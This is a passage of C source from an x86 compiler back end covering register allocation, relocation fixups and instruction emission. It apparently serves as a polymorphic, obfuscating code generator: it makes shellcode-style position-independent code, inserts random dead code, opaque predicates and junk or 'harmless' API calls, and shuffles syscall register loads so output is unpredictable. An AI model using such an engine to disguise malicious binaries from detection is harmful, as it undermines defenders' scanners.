    int reg = ra_find_free(cg);
    if (reg < 0) {
        reg = ra_pick_victim(cg, -1, -1, -1);
        ra_spill_reg(cg, reg);
    }
    cg->ra_alloc[reg] = -2;  // scratch
    load_operand(cg, op, reg);
    return reg;
}

// Same as ra_load_src but excludes a specific register from being chosen.
// Use as the "second load" in two-operand patterns to avoid evicting r1.
int ra_load_src_ex(struct CodeGen* cg, struct Operand* op, int exclude) {
    if (op->kind == VK_TEMP) {
        return ra_ensure_ex(cg, op->index, exclude);
    }
    int reg = -1;
    for (int i = 0; i < cg->ra_num_regs; i++) {
        int r = cg->ra_reg_order[i];
        if (r == exclude) continue;
        if (cg->ra_alloc[r] == -1) { reg = r; break; }
    }
    if (reg < 0) {
        reg = ra_pick_victim(cg, exclude, -1, -1);
        ra_spill_reg(cg, reg);
    }
    cg->ra_alloc[reg] = -2;
    load_operand(cg, op, reg);
    return reg;
}

// Get a scratch register not in {ex1, ex2, ex3}
int ra_get_scratch(struct CodeGen* cg, int ex1, int ex2, int ex3) {
    for (int i = 0; i < cg->ra_num_regs; i++) {
        int r = cg->ra_reg_order[i];
        if (r == ex1 || r == ex2 || r == ex3) continue;
        if (cg->ra_alloc[r] == -1) {  // truly free only (not -2 in-use scratch)
            cg->ra_alloc[r] = -2;
            return r;
        }
    }
    // No free register — spill one
    int r = ra_pick_victim(cg, ex1, ex2, ex3);
    ra_spill_reg(cg, r);
    cg->ra_alloc[r] = -2;
    return r;
}

// Free temps whose last use was the current instruction
void ra_free_dead(struct CodeGen* cg) {
    for (int r = 0; r < 8; r++) {
        int t = cg->ra_alloc[r];
        if (t >= 0 && cg->ra_last_use[t] == cg->ra_cur_instr) {
            if (cg->ra_dirty[t]) {
                int offset = -(4 + t * 4);
                emit_mov_mr_disp(cg->code, REG_EBP, offset, r);
            }
            cg->ra_dirty[t] = 0;
            cg->ra_temp_reg[t] = -1;
            cg->ra_alloc[r] = -1;
        }
    }
}

// Clear scratch register markers
void ra_clear_scratch(struct CodeGen* cg) {
    for (int r = 0; r < 8; r++) {
        if (cg->ra_alloc[r] == -2) cg->ra_alloc[r] = -1;
    }
}

// Make sure a register is free (spill if occupied). Mark as scratch.
void ra_free_reg(struct CodeGen* cg, int reg) {
    if (cg->ra_alloc[reg] >= 0) ra_spill_reg(cg, reg);
    cg->ra_alloc[reg] = -2;
}

int get_temp_offset(struct CodeGen* cg, int temp_idx) {
    // Temps are stored on stack relative to EBP
    return -(4 + temp_idx * 4);
}

int get_local_offset(struct CodeGen* cg, int local_idx) {
    // Locals come after temps, with variable sizes (min 4 bytes each)
    int offset = -(cg->current_func->temp_count * 4);
    for (int i = 0; i <= local_idx; i++) {
        int sz = cg->current_func->local_sizes[i];
        if (sz < 4) sz = 4;  // Minimum 4 bytes for scalar locals (frontend writes 0)
        offset -= sz;
    }
    return offset;
}

int get_param_offset(int param_idx) {
    // Parameters are above saved EBP and return address
    return 8 + param_idx * 4;
}

void add_str_fixup(struct CodeGen* cg, int code_offset, int str_idx, int base_offset) {
    if (cg->str_fixup_count >= cg->str_fixup_cap) {
        cg->str_fixup_cap = cg->str_fixup_cap ? cg->str_fixup_cap * 2 : 32;
        cg->str_fixup_offsets = (int*)realloc(cg->str_fixup_offsets, sizeof(int) * cg->str_fixup_cap);
        cg->str_fixup_indices = (int*)realloc(cg->str_fixup_indices, sizeof(int) * cg->str_fixup_cap);
        cg->str_fixup_bases = (int*)realloc(cg->str_fixup_bases, sizeof(int) * cg->str_fixup_cap);
    }
    cg->str_fixup_offsets[cg->str_fixup_count] = code_offset;
    cg->str_fixup_indices[cg->str_fixup_count] = str_idx;
    cg->str_fixup_bases[cg->str_fixup_count] = base_offset;
    cg->str_fixup_count++;
}

void add_glob_fixup(struct CodeGen* cg, int code_offset, int glob_idx, int base_offset) {
    if (cg->glob_fixup_count >= cg->glob_fixup_cap) {
        cg->glob_fixup_cap = cg->glob_fixup_cap ? cg->glob_fixup_cap * 2 : 32;
        cg->glob_fixup_offsets = (int*)realloc(cg->glob_fixup_offsets, sizeof(int) * cg->glob_fixup_cap);
        cg->glob_fixup_indices = (int*)realloc(cg->glob_fixup_indices, sizeof(int) * cg->glob_fixup_cap);
        cg->glob_fixup_bases = (int*)realloc(cg->glob_fixup_bases, sizeof(int) * cg->glob_fixup_cap);
    }
    cg->glob_fixup_offsets[cg->glob_fixup_count] = code_offset;
    cg->glob_fixup_indices[cg->glob_fixup_count] = glob_idx;
    cg->glob_fixup_bases[cg->glob_fixup_count] = base_offset;
    cg->glob_fixup_count++;
}

void add_abs_data_fixup(struct CodeGen* cg, int code_offset, int data_section_offset) {
    if (cg->abs_data_fixup_count >= cg->abs_data_fixup_cap) {
        cg->abs_data_fixup_cap = cg->abs_data_fixup_cap ? cg->abs_data_fixup_cap * 2 : 32;
        cg->abs_data_fixup_offsets = (int*)realloc(cg->abs_data_fixup_offsets, sizeof(int) * cg->abs_data_fixup_cap);
        cg->abs_data_fixup_data_offs = (int*)realloc(cg->abs_data_fixup_data_offs, sizeof(int) * cg->abs_data_fixup_cap);
    }
    cg->abs_data_fixup_offsets[cg->abs_data_fixup_count] = code_offset;
    cg->abs_data_fixup_data_offs[cg->abs_data_fixup_count] = data_section_offset;
    cg->abs_data_fixup_count++;
}

void add_abs_extern_fixup(struct CodeGen* cg, int code_offset, int api_slot) {
    if (cg->abs_extern_fixup_count >= cg->abs_extern_fixup_cap) {
        cg->abs_extern_fixup_cap = cg->abs_extern_fixup_cap ? cg->abs_extern_fixup_cap * 2 : 32;
        cg->abs_extern_fixup_offsets = (int*)realloc(cg->abs_extern_fixup_offsets, sizeof(int) * cg->abs_extern_fixup_cap);
        cg->abs_extern_fixup_slots = (int*)realloc(cg->abs_extern_fixup_slots, sizeof(int) * cg->abs_extern_fixup_cap);
    }
    cg->abs_extern_fixup_offsets[cg->abs_extern_fixup_count] = code_offset;
    cg->abs_extern_fixup_slots[cg->abs_extern_fixup_count] = api_slot;
    cg->abs_extern_fixup_count++;
}

void load_operand(struct CodeGen* cg, struct Operand* op, int dst_reg) {
    struct Buffer* code = cg->code;

    if (op->kind == VK_CONST) {
        emit_mov_ri(code, dst_reg, op->value);
    } else if (op->kind == VK_TEMP) {
        int offset = get_temp_offset(cg, op->index);
        emit_mov_rm_disp(code, dst_reg, REG_EBP, offset);
    } else if (op->kind == VK_PARAM) {
        int offset = get_param_offset(op->index);
        emit_mov_rm_disp(code, dst_reg, REG_EBP, offset);
    } else if (op->kind == VK_LOCAL) {
        int offset = get_local_offset(cg, op->index);
        emit_mov_rm_disp(code, dst_reg, REG_EBP, offset);
    } else if (op->kind == VK_STRING) {
        if (cg->pic_mode) {
            // PIC mode: calculate string address at runtime
            // call next; pop dst_reg; add dst_reg, (code_size - base + string_offset)
            // We'll use a fixup since we don't know code_size yet
            emit_byte(code, 0xE8);
            emit_u32(code, 0);
            int base_pos = code->len;
            emit_pop(code, dst_reg);
            emit_byte(code, 0x81);
            emit_byte(code, 0xC0 + dst_reg);
            int fixup_pos = code->len;
            emit_u32(code, 0);
            add_str_fixup(cg, fixup_pos, op->index, base_pos);
        } else if (cg->abs_mode) {
            // Absolute mode: MOV reg, imm32 (placeholder patched to image_base + data_rva + string_offset)
            emit_mov_ri(code, dst_reg, 0);  // B8+reg 00000000
            add_abs_data_fixup(cg, code->len - 4, cg->string_offsets[op->index]);
        } else {
            emit_mov_ri(code, dst_reg, cg->string_offsets[op->index]);
        }
    } else if (op->kind == VK_GLOBAL) {
        if (cg->pic_mode) {
            // PIC mode: calculate global address at runtime, then load value
            // call next; pop dst_reg; add dst_reg, displacement; mov dst_reg, [dst_reg]
            emit_byte(code, 0xE8);
            emit_u32(code, 0);
            int base_pos = code->len;
            emit_pop(code, dst_reg);
            emit_byte(code, 0x81);
            emit_byte(code, 0xC0 + dst_reg);
            int fixup_pos = code->len;
            emit_u32(code, 0);
            add_glob_fixup(cg, fixup_pos, op->index, base_pos);
            // Now dst_reg has the address of the global, dereference it
            emit_mov_rm(code, dst_reg, dst_reg);  // MOV dst_reg, [dst_reg]
        } else if (cg->abs_mode) {
            // Absolute mode: MOV reg, [disp32] — direct memory load from absolute address
            // Encoding: 8B ModRM(00,reg,101) disp32
            emit_byte(code, 0x8B);
            emit_byte(code, modrm(0, dst_reg, 5));  // mod=00, rm=101 = [disp32]
            int fixup_pos = code->len;
            emit_u32(code, 0);  // placeholder
            add_abs_data_fixup(cg, fixup_pos, cg->global_offsets[op->index]);
        } else {
            emit_mov_ri(code, dst_reg, cg->global_offsets[op->index]);
            emit_mov_rm(code, dst_reg, dst_reg);
        }
    }
}

// Shared helper for OP_DIV and OP_MOD
static void gen_divmod(struct CodeGen* cg, struct Instruction* ins, int use_edx) {
    struct Buffer* code = cg->code;
    int r2 = ra_load_src(cg, &ins->src2);
    if (ins->src1.kind == VK_TEMP) {
        ra_force(cg, ins->src1.index, REG_EAX);
    } else {
        ra_free_reg(cg, REG_EAX);
        load_operand(cg, &ins->src1, REG_EAX);
        cg->ra_alloc[REG_EAX] = -2;
    }
    // Re-read r2: ra_force may have displaced src2
    if (ins->src2.kind == VK_TEMP) {
        r2 = cg->ra_temp_reg[ins->src2.index];
        if (r2 < 0) r2 = ra_ensure_ex(cg, ins->src2.index, REG_EAX);
    } else if (r2 == REG_EAX || cg->ra_alloc[r2] != -2) {
        r2 = ra_get_scratch(cg, REG_EAX, REG_EDX, -1);
        load_operand(cg, &ins->src2, r2);
    }
    if (cg->ra_alloc[REG_EDX] >= 0) ra_spill_reg(cg, REG_EDX);
    cg->ra_alloc[REG_EDX] = -2;
    if (r2 == REG_EAX || r2 == REG_EDX) {
        int safe = ra_get_scratch(cg, REG_EAX, REG_EDX, -1);
        emit_mov_rr(code, safe, r2);
        if (cg->ra_alloc[r2] >= 0) {
            int t = cg->ra_alloc[r2];
            cg->ra_temp_reg[t] = safe;
            cg->ra_alloc[safe] = t;
            cg->ra_alloc[r2] = -2;
        }
        r2 = safe;
    }
    {
        int eax_occ = cg->ra_alloc[REG_EAX];
        if (use_edx) {
            // MOD: always spill EAX occupant
            if (eax_occ >= 0) {
                if (cg->ra_dirty[eax_occ]) {
                    int off = -(4 + eax_occ * 4);
                    emit_mov_mr_disp(cg->code, REG_EBP, off, REG_EAX);
                    cg->ra_dirty[eax_occ] = 0;
                }
                cg->ra_temp_reg[eax_occ] = -1;
            }
            cg->ra_alloc[REG_EAX] = -2;
        } else {
            // DIV: only spill if different from dest
            if (eax_occ >= 0 && eax_occ != ins->dest.index) {
                if (cg->ra_dirty[eax_occ]) {
                    int off = -(4 + eax_occ * 4);
                    emit_mov_mr_disp(cg->code, REG_EBP, off, REG_EAX);
                    cg->ra_dirty[eax_occ] = 0;
                }
                cg->ra_temp_reg[eax_occ] = -1;
            }
        }
    }
    emit_cdq(code);
    emit_idiv(code, r2);
    int result_reg = use_edx ? REG_EDX : REG_EAX;
    cg->ra_alloc[result_reg] = -2;
    if (ins->dest.kind == VK_TEMP) {
        cg->ra_alloc[result_reg] = ins->dest.index;
        cg->ra_temp_reg[ins->dest.index] = result_reg;
        cg->ra_dirty[ins->dest.index] = 1;
    }
}

// Shared helper for OP_SHL and OP_SHR
static void gen_shift(struct CodeGen* cg, struct Instruction* ins, int is_right) {
    struct Buffer* code = cg->code;
    int r1 = ra_load_src(cg, &ins->src1);
    if (ins->src2.kind == VK_TEMP) {
        ra_force(cg, ins->src2.index, REG_ECX);
    } else {
        ra_free_reg(cg, REG_ECX);
        load_operand(cg, &ins->src2, REG_ECX);
        cg->ra_alloc[REG_ECX] = -2;
    }
    // Re-read r1 after forcing ECX
    if (ins->src1.kind == VK_TEMP) {
        r1 = cg->ra_temp_reg[ins->src1.index];
        if (r1 < 0) r1 = ra_ensure_ex(cg, ins->src1.index, REG_ECX);
    } else if (r1 == REG_ECX || cg->ra_alloc[r1] != -2) {
        r1 = ra_get_scratch(cg, REG_ECX, -1, -1);
        load_operand(cg, &ins->src1, r1);
    }
    if (r1 == REG_ECX) {
        int alt = ra_get_scratch(cg, REG_ECX, -1, -1);
        emit_mov_rr(code, alt, r1);
        if (cg->ra_alloc[r1] >= 0) {
            int t = cg->ra_alloc[r1];
            cg->ra_temp_reg[t] = alt;
            cg->ra_alloc[alt] = t;
            cg->ra_alloc[r1] = -2;
        }
        r1 = alt;
    }
    int rd = ra_def(cg, ins->dest.index, r1, REG_ECX);
    if (rd == REG_ECX) {
        int alt = ra_get_scratch(cg, REG_ECX, r1, -1);
        cg->ra_alloc[REG_ECX] = -2;
        cg->ra_alloc[alt] = ins->dest.index;
        cg->ra_temp_reg[ins->dest.index] = alt;
        cg->ra_dirty[ins->dest.index] = 1;
        rd = alt;
    }
    if (rd != r1) emit_mov_rr(code, rd, r1);
    if (is_right) emit_shr_cl(code, rd);
    else emit_shl_cl(code, rd);
}

// Shared helper for OP_CALL and OP_CALLV
static void gen_call_common(struct CodeGen* cg, struct Instruction* ins, int has_return) {
    struct Buffer* code = cg->code;
    ra_spill_all(cg);
    struct Function* target_func = &cg->mod->funcs[ins->func_idx];
    int is_extern = (target_func->block_count == 0);

    if (cg->abs_mode == 1 && is_extern) {
        for (int a = ins->arg_count - 1; a >= 0; a--) {
            load_operand(cg, &ins->args[a], REG_EAX);
            emit_push(code, REG_EAX);
        }
        emit_byte(code, 0xFF);
        emit_byte(code, 0x15);
        add_abs_extern_fixup(cg, code->len, cg->mod->funcs[ins->func_idx].api_slot);
        emit_u32(code, 0);
    } else if (cg->abs_mode == 2 && is_extern) {
        for (int a = ins->arg_count - 1; a >= 0; a--) {
            load_operand(cg, &ins->args[a], REG_EAX);
            emit_push(code, REG_EAX);
        }
        emit_byte(code, 0xE8);
        add_abs_extern_fixup(cg, code->len, cg->mod->funcs[ins->func_idx].api_slot);
        emit_u32(code, 0);
        if (ins->arg_count > 0) {
            emit_add_ri(code, REG_ESP, ins->arg_count * 4);
        }
    } else if (cg->pic_mode && is_extern) {
        int current_pos = code->len;
        emit_byte(code, 0xE8);
        emit_u32(code, 0);
        emit_pop(code, REG_EBX);
        emit_sub_ri(code, REG_EBX, current_pos + 5);
        emit_mov_rm_disp(code, REG_EAX, REG_EBX, cg->api_slot_offset);
        emit_mov_rm_disp(code, REG_EAX, REG_EAX, cg->mod->funcs[ins->func_idx].api_slot * 4);
        emit_push(code, REG_EAX);
        for (int a = ins->arg_count - 1; a >= 0; a--) {
            load_operand(cg, &ins->args[a], REG_ECX);
            emit_push(code, REG_ECX);
        }
        emit_mov_rm_disp(code, REG_EAX, REG_ESP, ins->arg_count * 4);
        emit_byte(code, 0xFF);
        emit_byte(code, 0xD0);
        emit_add_ri(code, REG_ESP, cg->cdecl_externs ? (ins->arg_count + 1) * 4 : 4);
    } else {
        for (int a = ins->arg_count - 1; a >= 0; a--) {
            load_operand(cg, &ins->args[a], REG_EAX);
            emit_push(code, REG_EAX);
        }
        emit_byte(code, 0xE8);
        add_call_fixup(cg, code->len, ins->func_idx);
        emit_u32(code, 0);
        if (ins->arg_count > 0) {
            emit_add_ri(code, REG_ESP, ins->arg_count * 4);
        }
    }
    if (has_return && ins->dest.kind == VK_TEMP) {
        cg->ra_alloc[REG_EAX] = ins->dest.index;
        cg->ra_temp_reg[ins->dest.index] = REG_EAX;
        cg->ra_dirty[ins->dest.index] = 1;
    }
}

// OP_SYSCALL — Linux INT 0x80 with polymorphic register-load order.
// Args: ins->args[0]=num, [1..5]=a1..a5 (mapped to EAX, EBX, ECX, EDX, ESI, EDI).
// Result lands in EAX.
static void gen_syscall_common(struct CodeGen* cg, struct Instruction* ins) {
    struct Buffer* code = cg->code;
    ra_spill_all(cg);

    // (register, arg-index) pairs; arg 0 is the syscall number → EAX.
    int regs[6] = { REG_EAX, REG_EBX, REG_ECX, REG_EDX, REG_ESI, REG_EDI };
    int arg_for_reg[6] = { 0, 1, 2, 3, 4, 5 };

    // Fisher-Yates shuffle the load order so neither the reg nor the arg
    // loaded first is predictable. The mapping reg→arg is preserved.
    int order[6] = { 0, 1, 2, 3, 4, 5 };
    for (int i = 5; i > 0; i--) {
        int j = prng_range(cg->prng, i + 1);
        int t = order[i]; order[i] = order[j]; order[j] = t;
    }

    for (int k = 0; k < 6; k++) {
        int slot = order[k];
        int reg = regs[slot];
        struct Operand* op = &ins->args[arg_for_reg[slot]];

        // Make sure RA isn't holding anything in this register.
        if (cg->ra_alloc[reg] >= 0) ra_spill_reg(cg, reg);
        cg->ra_alloc[reg] = -2;  // claim as scratch for this load

        if (op->kind == VK_CONST) {
            // Direct MOV reg, imm32. (Polymorphic variants can be added later.)
            emit_mov_ri(code, reg, op->value);
        } else {
            load_operand(cg, op, reg);
        }
    }

    // INT 0x80
    emit_byte(code, 0xCD);
    emit_byte(code, 0x80);

    // EAX now holds the result. All scratch claims drop.
    for (int r = 0; r < 8; r++) {
        if (cg->ra_alloc[r] == -2) cg->ra_alloc[r] = -1;
    }

    if (ins->dest.kind == VK_TEMP) {
        cg->ra_alloc[REG_EAX] = ins->dest.index;
        cg->ra_temp_reg[ins->dest.index] = REG_EAX;
        cg->ra_dirty[ins->dest.index] = 1;
    }
}

// Shared helper for OP_ICALL and OP_ICALLV (indirect call through variable)
static void gen_icall_common(struct CodeGen* cg, struct Instruction* ins, int has_return) {
    struct Buffer* code = cg->code;
    ra_spill_all(cg);

    // Push args in reverse order (cdecl)
    for (int a = ins->arg_count - 1; a >= 0; a--) {
        load_operand(cg, &ins->args[a], REG_EAX);
        emit_push(code, REG_EAX);
    }

    // Load target address into EAX
    load_operand(cg, &ins->src1, REG_EAX);

    // CALL EAX (FF D0)
    emit_byte(code, 0xFF);
    emit_byte(code, 0xD0);

    // cdecl cleanup
    if (ins->arg_count > 0) {
        emit_add_ri(code, REG_ESP, ins->arg_count * 4);
    }

    if (has_return && ins->dest.kind == VK_TEMP) {
        cg->ra_alloc[REG_EAX] = ins->dest.index;
        cg->ra_temp_reg[ins->dest.index] = REG_EAX;
        cg->ra_dirty[ins->dest.index] = 1;
    }
}

void gen_function(struct CodeGen* cg, struct Function* func, int func_idx) {
    struct Buffer* code = cg->code;
    cg->current_func = func;

    annot_begin_func(func->name, "real", code->len);

    // Initialize register allocator for this function
    ra_init_func(cg, func);

    // Calculate stack frame size: temps (spill area) + locals
    int frame_size = func->temp_count * 4;
    for (int li = 0; li < func->local_count; li++) {
        int sz = func->local_sizes[li];
        if (sz < 4) sz = 4;
        frame_size += sz;
    }
    frame_size = (frame_size + 15) & ~15;

    // Prologue (polymorphic SUB ESP variant when transforms active)
    { int _p = code->len;
      emit_push(code, REG_EBP);
      emit_mov_rr(code, REG_EBP, REG_ESP);
      if (frame_size > 0) {
          if (cg->x86.poly_instrs && prng_range(cg->prng, 2)) {
              emit_add_ri(code, REG_ESP, -frame_size);    // ADD ESP, -x
          } else {
              emit_sub_ri(code, REG_ESP, frame_size);     // SUB ESP, x
          }
      }
      emit_push(code, REG_EBX);
      emit_push(code, REG_ESI);
      emit_push(code, REG_EDI);
      annot_special(_p, code->len - _p, "prologue");
    }
    { int _b = code->len; if (cg->x86.dead_code) maybe_insert_dead(code, cg->prng, get_genome()->dead_prologue_pct); annot_dead(_b, code->len - _b); }

    // PIC mode: entry function stores API table pointer (skip in scatter mode)
    if (cg->pic_mode && !cg->abs_mode && func_idx == cg->entry_func_idx) {
        int current_pos = code->len;
        emit_byte(code, 0xE8);
        emit_u32(code, 0);
        emit_pop(code, REG_EBX);
        emit_sub_ri(code, REG_EBX, current_pos + 5);
        emit_mov_rm_disp(code, REG_EAX, REG_EBP, 8);
        emit_mov_mr_disp(code, REG_EBX, cg->api_slot_offset, REG_EAX);
    }

    cg->block_offsets = (int*)malloc(sizeof(int) * func->block_count);
    cg->fixup_count = 0;

    for (int b = 0; b < func->block_count; b++) {
        // Block boundary junk (skip after blocks ending with RET/RETV — unreachable)
        if (b > 0) {
            struct Block* prev = &func->blocks[b - 1];
            int prev_last_op = prev->instr_count > 0 ? prev->instrs[prev->instr_count - 1].opcode : -1;
            if (prev_last_op != 98 && prev_last_op != 99) {  // OP_RET=98, OP_RETV=99
                if (cg->x86.dead_code) { int _b = code->len; maybe_insert_dead(code, cg->prng, get_genome()->dead_block_pct); annot_dead(_b, code->len - _b); }
                if (cg->x86.opaque)    { int _b = code->len; maybe_insert_opaque(code, REG_EDX, REG_ESI, cg->prng, get_genome()->opaque_pct); annot_opaque(_b, code->len - _b); }
                { int _b = code->len; maybe_emit_junk_call(cg, get_genome()->junk_call_block_pct); annot_junk_call_ann(_b, code->len - _b); }
                maybe_emit_harmless_api_call(cg, get_genome()->harmless_block_pct);
            }
        }
        struct Block* blk = &func->blocks[b];
        cg->ra_cur_block = b;
        ra_begin_block(cg, blk);
        cg->block_offsets[b] = code->len;
        annot_block_label(code->len, blk->label);
        int block_returned = 0;

        for (int i = 0; i < blk->instr_count; i++) {
            if (block_returned) break;  // skip unreachable code after RET/RETV
            struct Instruction* ins = &blk->instrs[i];
            cg->ra_cur_instr = i;

            // Inter-instruction junk (RA-aware: junk only uses free registers)
            {
                if (cg->x86.dead_code) {
                    int _fr = pick_free_reg_cg(cg);
                    if (_fr >= 0) {
                        g_junk_ra_alloc = cg->ra_alloc;
                        g_junk_ra_num_regs = cg->ra_num_regs;
                        g_junk_ra_reg_order = cg->ra_reg_order;
                        int _b = code->len;
                        maybe_insert_dead(code, cg->prng, get_genome()->dead_instr_pct);
                        if (code->len > _b) annot_dead(_b, code->len - _b);
                        g_junk_ra_alloc = NULL;
                    }
                }
                if (cg->x86.junk_funcs) {
                    int _b = code->len;
                    // Junk calls clobber EAX/ECX/EDX — save RA-allocated ones
                    int _save_eax = (cg->ra_alloc[REG_EAX] >= 0);
                    int _save_ecx = (cg->ra_alloc[REG_ECX] >= 0);
                    int _save_edx = (cg->ra_alloc[REG_EDX] >= 0);
                    if (_save_eax) emit_push(code, REG_EAX);
                    if (_save_ecx) emit_push(code, REG_ECX);
                    if (_save_edx) emit_push(code, REG_EDX);
                    maybe_emit_junk_call(cg, get_genome()->junk_call_instr_pct);
                    if (code->len > _b + _save_eax + _save_ecx + _save_edx) {
                        if (_save_edx) emit_pop(code, REG_EDX);
                        if (_save_ecx) emit_pop(code, REG_ECX);
                        if (_save_eax) emit_pop(code, REG_EAX);
                        annot_junk_call_ann(_b, code->len - _b);
                    } else {
                        code->len = _b;  // undo pushes — no call emitted
                    }
                }
                // harmless API calls already save/restore registers internally
                maybe_emit_harmless_api_call(cg, get_genome()->harmless_instr_pct);
            }

            int _instr_start = code->len;
            switch (ins->opcode) {
                case 0: // NOP
                    emit_byte(code, 0x90);
                    break;

                case 1: // CONST
                {
                    int rd = ra_def(cg, ins->dest.index, -1, -1);
                    if (cg->x86.poly_instrs) {
                        emit_movi_poly(code, rd, ins->src1.value, cg->prng);
                    } else {
                        emit_mov_ri(code, rd, ins->src1.value);
                    }
                    break;
                }

                case 2: // COPY
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    if (ins->dest.kind == VK_TEMP) {
                        int rd = ra_def(cg, ins->dest.index, r1, -1);
                        if (rd != r1) emit_mov_rr(code, rd, r1);
                    }
                    break;
                }

                case 16: // ADD
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def_reuse(cg, ins->dest.index, r1, r2);
                    if (cg->x86.poly_instrs) {
                        int scr = ra_get_scratch(cg, rd, r1, r2);
                        if (rd != r1) emit_mov_rr(code, rd, r1);
                        emit_add_poly(code, rd, rd, r2, scr, cg->prng);
                    } else {
                        if (rd == r1) {
                            emit_add_rr(code, rd, r2);
                        } else if (rd == r2) {
                            emit_add_rr(code, rd, r1);
                        } else {
                            emit_mov_rr(code, rd, r1);
                            emit_add_rr(code, rd, r2);
                        }
                    }
                    break;
                }

                case 17: // SUB (non-commutative: rd = r1 - r2)
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def_reuse(cg, ins->dest.index, r1, r2);
                    if (cg->x86.poly_instrs) {
                        int scr = ra_get_scratch(cg, rd, r1, r2);
                        if (rd != r1) emit_mov_rr(code, rd, r1);
                        emit_sub_poly(code, rd, rd, r2, scr, cg->prng);
                    } else if (rd == r1) {
                        emit_sub_rr(code, rd, r2);
                    } else if (rd == r2) {
                        // rd has src2; negate then add src1: -r2 + r1 = r1 - r2
                        emit_neg(code, rd);
                        emit_add_rr(code, rd, r1);
                    } else {
                        emit_mov_rr(code, rd, r1);
                        emit_sub_rr(code, rd, r2);
                    }
                    break;
                }

                case 18: // MUL
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def_reuse(cg, ins->dest.index, r1, r2);
                    if (rd == r1) {
                        emit_imul_rr(code, rd, r2);
                    } else if (rd == r2) {
                        emit_imul_rr(code, rd, r1);
                    } else {
                        emit_mov_rr(code, rd, r1);
                        emit_imul_rr(code, rd, r2);
                    }
                    break;
                }

                case 19: // DIV — IDIV: quotient in EAX
                {
                    gen_divmod(cg, ins, 0);
                    break;
                }

                case 20: // MOD — IDIV: remainder in EDX
                {
                    gen_divmod(cg, ins, 1);
                    break;
                }

                case 21: // NEG
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int rd = ra_def(cg, ins->dest.index, r1, -1);
                    if (rd != r1) emit_mov_rr(code, rd, r1);
                    emit_neg(code, rd);
                    break;
                }

                case 32: // AND (commutative)
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def_reuse(cg, ins->dest.index, r1, r2);
                    if (rd == r1) {
                        emit_byte(code, 0x21); emit_byte(code, modrm(3, r2, rd));
                    } else if (rd == r2) {
                        emit_byte(code, 0x21); emit_byte(code, modrm(3, r1, rd));
                    } else {
                        emit_mov_rr(code, rd, r1);
                        emit_byte(code, 0x21); emit_byte(code, modrm(3, r2, rd));
                    }
                    break;
                }

                case 33: // OR (commutative)
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def_reuse(cg, ins->dest.index, r1, r2);
                    if (rd == r1) {
                        emit_byte(code, 0x09); emit_byte(code, modrm(3, r2, rd));
                    } else if (rd == r2) {
                        emit_byte(code, 0x09); emit_byte(code, modrm(3, r1, rd));
                    } else {
                        emit_mov_rr(code, rd, r1);
                        emit_byte(code, 0x09); emit_byte(code, modrm(3, r2, rd));
                    }
                    break;
                }

                case 34: // XOR (commutative)
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int r2 = ra_load_src_ex(cg, &ins->src2, r1);
                    int rd = ra_def_reuse(cg, ins->dest.index, r1, r2);
                    if (cg->x86.poly_instrs) {
                        int scr1 = ra_get_scratch(cg, rd, r1, r2);
                        int scr2 = ra_get_scratch(cg, rd, r2, scr1);
                        if (rd == r2 && rd != r1) {
                            // Swap: XOR is commutative
                            emit_mov_rr(code, rd, r2);
                            emit_xor_poly(code, rd, rd, r1, scr1, scr2, cg->prng);
                        } else {
                            if (rd != r1) emit_mov_rr(code, rd, r1);
                            emit_xor_poly(code, rd, rd, r2, scr1, scr2, cg->prng);
                        }
                    } else {
                        if (rd == r1) {
                            emit_xor_rr(code, rd, r2);
                        } else if (rd == r2) {
                            emit_xor_rr(code, rd, r1);
                        } else {
                            emit_mov_rr(code, rd, r1);
                            emit_xor_rr(code, rd, r2);
                        }
                    }
                    break;
                }

                case 35: // NOT
                {
                    int r1 = ra_load_src(cg, &ins->src1);
                    int rd = ra_def(cg, ins->dest.index, r1, -1);
                    if (rd != r1) emit_mov_rr(code, rd, r1);
                    emit_byte(code, 0xF7);
                    emit_byte(code, modrm(3, 2, rd));
                    break;
                }

                case 36: // SHL
                {
                    gen_shift(cg, ins, 0);
                    break;
                }

                case 37: // SHR
                {
                    gen_shift(cg, ins, 1);
                    break;
                }

                case 64: // LOAD
                {
                    if (ins->src1.kind == VK_LOCAL && ins->type_code == TC_PTR
                        && func->local_sizes[ins->src1.index] > 0) {
                        // LEA for local arrays
                        int rd = ra_def(cg, ins->dest.index, -1, -1);
                        int offset = get_local_offset(cg, ins->src1.index);
                        emit_byte(code, 0x8D);  // LEA
                        emit_byte(code, modrm(2, rd, REG_EBP));
                        emit_u32(code, offset);
                    } else if (ins->src1.kind == VK_PARAM && ins->type_code == TC_PTR) {
                        int rd = ra_def(cg, ins->dest.index, -1, -1);
                        int offset = get_param_offset(ins->src1.index);
                        emit_mov_rm_disp(code, rd, REG_EBP, offset);
                    } else {
                        int r1 = ra_load_src(cg, &ins->src1);
                        if (ins->src1.kind == VK_TEMP) {
                            // Dereference pointer: need a dest register
                            int rd = ra_def(cg, ins->dest.index, r1, -1);
                            if (ins->type_code == TC_I8) {
                                emit_movzx_rm_byte(code, rd, r1);
                            } else {
                                emit_mov_rm(code, rd, r1);
                            }
                        } else {
                            // Non-temp, non-special: r1 already has the value
                            if (ins->dest.kind == VK_TEMP) {
                                int rd = ra_def(cg, ins->dest.index, r1, -1);
                                if (rd != r1) emit_mov_rr(code, rd, r1);
                            }
                        }
                    }
                    break;
                }

                case 65: // STORE
                {
                    int need_byte = (ins->type_code == TC_I8);
                    int rv = ra_load_src(cg, &ins->src1);

                    // For byte stores, value must be in a byte-addressable register (EAX/ECX/EDX/EBX)
                    if (need_byte && rv >= 4 && rv != REG_EBX) {
                        int alt = ra_get_scratch(cg, rv, -1, -1);
                        // Prefer a byte-accessible register
                        if (alt >= 4 && alt != REG_EBX) {
                            // Force into EAX
                            ra_free_reg(cg, REG_EAX);
                            alt = REG_EAX;
                            cg->ra_alloc[REG_EAX] = -2;
